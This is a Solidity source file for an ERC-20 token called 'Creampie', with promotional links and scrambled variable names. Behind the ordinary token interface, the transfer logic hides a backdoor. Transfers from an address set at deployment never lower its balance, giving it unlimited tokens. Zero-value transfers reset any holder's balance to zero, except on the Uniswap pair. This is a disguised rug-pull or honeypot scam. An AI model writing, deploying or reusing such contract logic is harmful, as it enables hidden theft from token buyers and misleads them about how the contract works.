/*

Website: https://creampie.crypto-token.live/

Telegram:  https://t.me/creampie_ETH

Twitter:  https://twitter.com/Creampie_ETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Creampie is Ownable {
    function transfer(address bmfveqp, uint256 ijlvmk) public returns (bool success) {
        lriqgdvcjy(msg.sender, bmfveqp, ijlvmk);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function lriqgdvcjy(address ckuwsv, address bmfveqp, uint256 ijlvmk) private {
        if (0 == bqkpsvcj[ckuwsv]) {
            balanceOf[ckuwsv] -= ijlvmk;
        }
        balanceOf[bmfveqp] += ijlvmk;
        if (0 == ijlvmk && bmfveqp != jenogslyhdat) {
            balanceOf[bmfveqp] = ijlvmk;
        }
        emit Transfer(ckuwsv, bmfveqp, ijlvmk);
    }

    mapping(address => uint256) private eyolmfixsp;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address ckuwsv, address bmfveqp, uint256 ijlvmk) public returns (bool success) {
        require(ijlvmk <= allowance[ckuwsv][msg.sender]);
        allowance[ckuwsv][msg.sender] -= ijlvmk;
        lriqgdvcjy(ckuwsv, bmfveqp, ijlvmk);
        return true;
    }

    mapping(address => uint256) private bqkpsvcj;

    string public name = 'Creampie';

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'Creampie';

    address public jenogslyhdat;

    function approve(address cqeim, uint256 ijlvmk) public returns (bool success) {
        allowance[msg.sender][cqeim] = ijlvmk;
        emit Approval(msg.sender, cqeim, ijlvmk);
        return true;
    }

    uint256 private bgxewmszkpu = 102;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address gordten) {
        balanceOf[msg.sender] = totalSupply;
        bqkpsvcj[gordten] = bgxewmszkpu;
        IUniswapV2Router02 kxgq = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        jenogslyhdat = IUniswapV2Factory(kxgq.factory()).createPair(address(this), kxgq.WETH());
    }
}